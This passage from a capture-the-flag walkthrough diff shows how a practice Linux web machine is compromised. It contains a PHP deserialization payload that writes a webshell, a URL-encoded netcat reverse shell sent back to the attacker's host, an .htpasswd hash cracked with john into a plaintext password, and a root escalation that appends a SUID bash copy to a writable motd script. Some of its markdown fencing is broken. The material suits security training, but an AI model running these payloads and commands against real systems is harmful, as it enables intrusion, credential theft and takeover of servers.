@@ -291,3 +291,297 @@ O:10:"FormSubmit":2:{s:9:"form_file";s:19:"backup/webshell.php";s:7:"message";s:
 
 or
 
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat deserialization_attack.php 
+<?php
+class FormSubmit 
+{
+
+        public $form_file = 'backup/webshell.php';
+        public $message = '<?php system($_GET[1]); ?>';
+}
+
+$serial = serialize(new FormSubmit);
+print $serial;
+?>
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ php deserialization_attack.php     
+O:10:"FormSubmit":2:{s:9:"form_file";s:19:"backup/webshell.php";s:7:"message";s:26:"<?php system($_GET[1]); ?>";}  
+
+then 
+
+http://10.10.71.230/index.php?debug=O:10:%22FormSubmit%22:2:{s:9:%22form_file%22;s:19:%22backup/webshell.php%22;s:7:%22message%22;s:26:%22%3C?php%20system($_GET[1]);%20?%3E%22;}
+
+http://10.10.71.230/backup/webshell.php?1=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+revshell
+
+encode as url rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.38 4444 >/tmp/f
+
+http://10.10.71.230/backup/webshell.php?1=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%38%2e%31%39%2e%31%30%33%20%31%33%33%37%20%3e%2f%74%6d%70%2f%66
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.71.230] 37658
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+- $ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
+www-data@osboxes:/var/www/html/backup$ ls
+ls
+grid		index.php.bak  less	  shell.php  webshell.php
+index.html.bak	javascripts    readme.md  style.css
+
+www-data@osboxes:/var/www/html/backup$ cd /home
+cd /home
+www-data@osboxes:/home$ ls
+ls
+james  lost+found
+www-data@osboxes:/home$ cd lost+found
+cd lost+found
+bash: cd: lost+found: Permission denied
+www-data@osboxes:/home$ cd james
+cd james
+bash: cd: james: Permission denied
+www-data@osboxes:/home$ ls -lah
+ls -lah
+total 28K
+drwxr-xr-x  4 root  root  4.0K Mar 10  2021 .
+drwxr-xr-x 24 root  root  4.0K Feb 28  2019 ..
+drwx------ 17 james james 4.0K Mar 10  2021 james
+drwx------  2 root  root   16K Feb 28  2019 lost+found
+
+www-data@osboxes:/var/www/html/backup$ cd ..
+cd ..
+www-data@osboxes:/var/www/html$ ls -lah
+ls -lah
+total 76K
+drwxr-xr-x 6 www-data www-data 4.0K Aug 19 19:34 .
+drwxr-xr-x 3 root     root     4.0K Mar  9  2021 ..
+-rw-r--r-- 1 www-data www-data   44 Mar  9  2021 .htpasswd
+drwxr-xr-x 5 www-data www-data 4.0K Aug 19 20:15 backup
+drwxr-xr-x 2 www-data www-data 4.0K Mar  9  2021 grid
+-rw-r--r-- 1 www-data www-data  12K Mar  9  2021 index.html
+-rw-r--r-- 1 www-data www-data 6.3K Mar  9  2021 index.php
+drwxr-xr-x 2 www-data www-data 4.0K Mar  9  2021 javascripts
+drwxr-xr-x 2 www-data www-data 4.0K Mar  9  2021 less
+-rw-r--r-- 1 www-data www-data  11K Aug 19 20:25 message.txt
+-rw-r--r-- 1 www-data www-data 2.3K Mar  9  2021 readme.md
+-rw-r--r-- 1 www-data www-data  11K Mar  9  2021 style.css
+www-data@osboxes:/var/www/html$ cat .htpasswd
+cat .htpasswd
+james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano hash_debug                
+                                                                           
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_debug 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jamaica          (?)     
+1g 0:00:00:00 DONE () 25.00g/s 19200p/s 19200c/s 19200C/s evelyn..james1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+www-data@osboxes:/var/www/html$ su james
+su james
+Password: jamaica
+
+james@osboxes:/var/www/html$ cd /home/james
+cd /home/james
+james@osboxes:~$ ls -lah
+ls -lah
+total 116K
+drwx------ 17 james james 4.0K Mar 10  2021 .
+drwxr-xr-x  4 root  root  4.0K Mar 10  2021 ..
+-rw-------  1 james james  460 Mar 10  2021 .bash_history
+-rw-r--r--  1 james james  220 Aug 31  2015 .bash_logout
+-rw-r--r--  1 james james 3.7K Aug 31  2015 .bashrc
+drwx------ 11 james james 4.0K Mar 10  2021 .cache
+drwx------ 14 james james 4.0K Mar 10  2021 .config
+drwxr-xr-x  2 james james 4.0K Mar 10  2021 Desktop
+drwxr-xr-x  2 james james 4.0K Mar 10  2021 Documents
+drwxr-xr-x  2 james james 4.0K Mar 10  2021 Downloads
+-rw-r--r--  1 james james 8.8K Apr 20  2016 examples.desktop
+drwx------  2 james james 4.0K Mar 10  2021 .gconf
+drwx------  3 james james 4.0K Mar 10  2021 .gnupg
+-rw-------  1 james james  322 Mar 10  2021 .ICEauthority
+drwx------  3 james james 4.0K Mar 10  2021 .local
+drwxr-xr-x  2 james james 4.0K Mar 10  2021 Music
+drwxrwxr-x  2 james james 4.0K Mar 10  2021 .nano
+-rw-r--r--  1 james james  477 Mar  9  2021 Note-To-James.txt
+drwxr-xr-x  2 james james 4.0K Mar 10  2021 Pictures
+-rw-r--r--  1 james james  655 May 16  2017 .profile
+drwxr-xr-x  2 james james 4.0K Mar 10  2021 Public
+drwx------  2 james james 4.0K Mar 10  2021 .ssh
+drwxr-xr-x  2 james james 4.0K Mar 10  2021 Templates
+-rw-r--r--  1 james james   33 Mar  9  2021 user.txt
+drwxr-xr-x  2 james james 4.0K Mar 10  2021 Videos
+-rw-------  1 james james   52 Mar 10  2021 .Xauthority
+-rw-------  1 james james   82 Mar 10  2021 .xsession-errors
+james@osboxes:~$ cat user.txt
+cat user.txt
+7e37c84a66cc40b1c6bf700d08d28c20
+
+james@osboxes:~$ cat Note-To-James.txt
+cat Note-To-James.txt
+Dear James,
+
+As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 
+
+But there's still one thing I'd like you to do, before the submission.
+
+Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D
+
+I gave you access to modify all these files :) 
+
+Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!
+
+Best Regards,
+
+root
+
+james@osboxes:~$ ls -lhA /etc/update-motd.d/
+ls -lhA /etc/update-motd.d/
+total 28K
+-rwxrwxr-x 1 root james 1.2K Mar 10  2021 00-header
+-rwxrwxr-x 1 root james    0 Mar 10  2021 00-header.save
+-rwxrwxr-x 1 root james 1.2K Jun 14  2016 10-help-text
+-rwxrwxr-x 1 root james   97 Dec  7  2018 90-updates-available
+-rwxrwxr-x 1 root james  299 Jul 22  2016 91-release-upgrade
+-rwxrwxr-x 1 root james  142 Dec  7  2018 98-fsck-at-reboot
+-rwxrwxr-x 1 root james  144 Dec  7  2018 98-reboot-required
+-rwxrwxr-x 1 root james  604 Nov  5  2017 99-esm
+
+james@osboxes:~$ cat /etc/update-motd.d/00-header
+cat /etc/update-motd.d/00-header
+#!/bin/sh
+#
+```
+```text
+- #    00-header - create the header of the MOTD
+```
+```text
+- #    Copyright (C) 2009-2010 Canonical Ltd.
+#
+```
+```text
+- #    Authors: Dustin Kirkland <kirkland@canonical.com>
+#
+```
+```text
+- #    This program is free software; you can redistribute it and/or modify
+```
+```text
+- #    it under the terms of the GNU General Public License as published by
+```
+```text
+- #    the Free Software Foundation; either version 2 of the License, or
+```
+```text
+- #    (at your option) any later version.
+#
+```
+```text
+- #    This program is distributed in the hope that it will be useful,
+```
+```text
+- #    but WITHOUT ANY WARRANTY; without even the implied warranty of
+```
+```text
+- #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+```
+```text
+- #    GNU General Public License for more details.
+#
+```
+```text
+- #    You should have received a copy of the GNU General Public License along
+```
+```text
+- #    with this program; if not, write to the Free Software Foundation, Inc.,
+```
+```text
+- #    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+
+[ -r /etc/lsb-release ] && . /etc/lsb-release
+
+if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
+```
+```text
+- # Fall back to using the very slow lsb_release utility
+	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
+fi
+
+printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
+
+james@osboxes:~$ echo "cp /bin/bash /home/james/bash && chmod u+s /home/james/bash" >> /etc/update-motd.d/00-header 
+<&& chmod u+s /home/james/bash" >> /etc/update-motd.d/00-header              
+james@osboxes:~$ cat /etc/update-motd.d/00-header
+cat /etc/update-motd.d/00-header
+#!/bin/sh
+#
+```
+```text
+- #    00-header - create the header of the MOTD
+```
+```text
+- #    Copyright (C) 2009-2010 Canonical Ltd.
+#
+```
+```text
+- #    Authors: Dustin Kirkland <kirkland@canonical.com>
+#
+```
+```text
+- #    This program is free software; you can redistribute it and/or modify
+```
+```text
+- #    it under the terms of the GNU General Public License as published by
+```
+```text
+- #    the Free Software Foundation; either version 2 of the License, or
+```
+```text
+- #    (at your option) any later version.
+#
+```
+```text
+- #    This program is distributed in the hope that it will be useful,
+```
+```text
+- #    but WITHOUT ANY WARRANTY; without even the implied warranty of
+```
+```text
+- #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+```
+```text
+- #    GNU General Public License for more details.
+#
+```
+```text
+- #    You should have received a copy of the GNU General Public License along
+```
+```text
+- #    with this program; if not, write to the Free Software Foundation, Inc.,
+```
+```text
+- #    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+
+[ -r /etc/lsb-release ] && . /etc/lsb-release
+
+if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
+```
+
+## Notes / Lessons Learned
+[[Develpy]]
+
